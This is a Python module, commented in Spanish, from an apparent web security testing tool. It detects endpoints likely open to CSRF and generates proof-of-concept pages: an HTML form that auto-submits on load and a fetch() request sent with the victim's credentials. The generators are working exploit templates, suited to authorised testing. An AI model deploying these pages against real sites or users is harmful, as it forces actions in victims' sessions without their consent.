"""
Detección de endpoints potencialmente vulnerables a CSRF y generación de
PoC. La v2.1 tenía esta lógica de detección duplicada en core/analyzer.py
(nunca importada) y en lethal.py (una copia simplificada). Aquí queda
unificada, usando los nombres de token desde config/patterns.yaml.

También se añade generar_poc_html(), que es lo que el README original
prometía ("Auto-submit forms", "ataques vía fetch()") pero que el
binario v2.1 nunca generaba -- solo enviaba una petición de login
forzada, no un PoC reutilizable.
"""
from urllib.parse import urlparse, parse_qs

from bs4 import BeautifulSoup

from core.config import CONFIG

METODOS_CSRF = ["POST", "PUT", "DELETE", "PATCH"]


def extraer_token_csrf_de_html(html: str):
    """Busca un token CSRF en un formulario HTML (input hidden con nombre
    típico de token) -- necesario para armar un PoC real, no solo detectar
    que "probablemente" hay CSRF."""
    soup = BeautifulSoup(html, "html.parser")
    for inp in soup.find_all("input", {"type": "hidden"}):
        nombre = (inp.get("name") or "").lower()
        if any(t in nombre for t in CONFIG.csrf_token_names):
            return inp.get("name"), inp.get("value")
    return None, None


def detectar_csrf(method, headers, body=None, url=None):
    """Devuelve dict con el veredicto y las señales encontradas (en vez de
    solo imprimir por stdout como hacía la v2.1 -- así se puede usar
    tanto en CLI como en tests)."""
    method = method.upper()
    cabeceras = {k.lower(): v for k, v in (headers or {}).items()}

    tiene_token_header = any(t in cabeceras for t in CONFIG.csrf_token_names)
    body_str = str(body).lower() if body else ""
    tiene_token_body = any(t in body_str for t in CONFIG.csrf_token_names)
    tiene_token_url = False
    if url:
        qs = parse_qs(urlparse(url).query)
        tiene_token_url = any(t in qs for t in CONFIG.csrf_token_names)
    tiene_cookie = "cookie" in cabeceras

    ruta_sensible = False
    if url:
        path = urlparse(url).path.lower()
        ruta_sensible = any(k in path for k in CONFIG.csrf_sensitive_path_keywords)

    same_site = "samesite" in cabeceras.get("cookie", "").lower()
    auth_val = cabeceras.get("authorization", "").lower()
    es_bearer_jwt = "bearer" in auth_val

    protegido = tiene_token_header or tiene_token_body or tiene_token_url
    sospechoso = (
        method in METODOS_CSRF
        and tiene_cookie
        and not protegido
        and not es_bearer_jwt  # si depende de Bearer/JWT en header, no de cookie, no es CSRF clásico
    )

    return {
        "sospechoso": sospechoso,
        "metodo": method,
        "ruta_sensible": ruta_sensible,
        "same_site_cookie": same_site,
        "usa_bearer_jwt": es_bearer_jwt,
        "tiene_token_anti_csrf": protegido,
    }


def generar_poc_html(url, method, campos: dict, titulo="CSRF PoC"):
    """PoC real de auto-submit form -- esto es lo que el README de la v2.1
    prometía y no generaba. Método por defecto: auto-submit al cargar la
    página, sin necesidad de interacción del usuario."""
    inputs = "\n    ".join(
        f'<input type="hidden" name="{k}" value="{v}">' for k, v in campos.items()
    )
    return f"""<!DOCTYPE html>
<html>
<head><title>{titulo}</title></head>
<body onload="document.forms[0].submit()">
  <form action="{url}" method="{method.upper()}">
    {inputs}
  </form>
  <p>Si esta página se autoenvía y la acción se ejecuta sin confirmación
  del usuario legítimo, el endpoint es vulnerable a CSRF.</p>
</body>
</html>
"""


def generar_poc_fetch(url, method, campos: dict, titulo="CSRF PoC (fetch)"):
    """Variante con fetch() + credentials:'include', útil cuando el target
    usa CORS permisivo o cuando el auto-submit form no aplica (ej. la
    acción espera JSON en el body en vez de form-urlencoded)."""
    body_json = str(campos).replace("'", '"')
    return f"""<!DOCTYPE html>
<html>
<head><title>{titulo}</title></head>
<body>
<script>
fetch("{url}", {{
  method: "{method.upper()}",
  credentials: "include",
  headers: {{"Content-Type": "application/json"}},
  body: JSON.stringify({body_json})
}});
</script>
<p>Si la petición fetch se ejecuta con la sesión de la víctima y la acción
tiene efecto, el endpoint es vulnerable a CSRF (revisar también la
política CORS del target).</p>
</body>
</html>
"""
